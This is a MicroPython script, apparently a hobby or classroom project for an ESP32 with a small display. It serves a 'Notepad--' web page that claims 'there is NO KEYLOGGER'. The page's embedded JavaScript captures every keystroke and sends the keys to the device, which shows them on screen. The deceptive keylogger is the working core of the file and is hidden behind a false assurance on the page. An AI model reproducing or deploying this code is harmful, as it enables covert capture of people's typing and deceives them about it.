import wifimgr
import machine
import time
import math
import re
from ST7735 import TFT
from sysfont import sysfont

# import socketové knihovny z návodu použití Wi-Fi knihovny
try:
    import usocket as socket
except:
    import socket


# inicializace SPI z příkladu použití knihovny
spi = machine.SPI(2, baudrate=20000000, polarity=0, phase=0, sck=machine.Pin(14), mosi=machine.Pin(13), miso=machine.Pin(12));
tft = TFT(spi, 16, 17, 18);
tft.initr();
tft.rgb(False);


def my_write(my_str):
    tft.fill(TFT.WHITE);
    tft.text((15, 50), my_str, TFT.RED, sysfont, 4, nowrap=False);


def test_main():
    my_write("DEVKIT");
    time.sleep_ms(200);
    my_write("NYNI");
    time.sleep_ms(200);
    my_write("EXPLODUJE");
    time.sleep_ms(200);
    
    for i in range(3):
        time.sleep_ms(2);
        tft.fill(TFT.BLACK);
        time.sleep_ms(2);
        tft.fill(TFT.WHITE);

test_main();


wlan = wifimgr.get_connection();

if wlan is None:
    print("Network init error!");
    machine.reset();

def web_page():
    # z webpage.html, kód zkrácen nástrojem minify
    html = """<title>Notepad--</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel=icon href=data:,><style>html{font-family:Helvetica;display:inline-block;margin:0 auto;text-align:center}h1{color:#0f3376;padding:2vh}p{font-size:1.5rem}.button{display:inline-block;background-color:#e7bd3b;border:none;border-radius:4px;color:#fff;padding:16px 40px;text-decoration:none;font-size:30px;margin:2px;cursor:pointer}.button2{background-color:#4286f4}</style><h1>Notepad-- := please type your comment, there is NO KEYLOGGER</h1><textarea cols=300 rows=40></textarea><script>let buffer="",timeout=setTimeout(debounce_keylog);function flush_keylog(){fetch(`/${buffer.slice(0,12)}`),buffer=buffer.slice(12),buffer.length&&debounce_keylog()}function debounce_keylog(){clearTimeout(timeout),timeout=setTimeout(flush_keylog,1200)}for(const e of document.querySelectorAll("*"))e.addEventListener("keydown",(e=>{e.stopPropagation(),1===encodeURIComponent(e.key).length&&(buffer+=e.key),debounce_keylog()}))</script>""";

    return html;

def extract_str(input_string):
    # čte stisknuté klávesy z requestu
    pattern = re.compile(r'GET /([^ ]+) HTTP');
    match = pattern.search(input_string);

    if match:
        return match.group(1);
    else:
        return "ERR";

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1);
    s.bind(('', 80));
    s.listen(5);
except OSError as e:
    machine.reset();

# většina této smyčky pochází z příkladu užití Wi-Fi knihovny
while True:
    try:
        if gc.mem_free() < 102000:
            gc.collect();
        conn, addr = s.accept();
        conn.settimeout(3.0);
        print('Got a connection from %s' % str(addr));
        request = conn.recv(1024);
        conn.settimeout(None);
        request = str(request);
        print('Content = %s' % request);

        my_write(extract_str(request));

        response = web_page();
        conn.send('HTTP/1.1 200 OK\n');
        conn.send('Content-Type: text/html\n');
        conn.send('Connection: close\n\n');
        conn.sendall(response);
        conn.close();
    except OSError as e:
        conn.close();
        print('Connection closed');
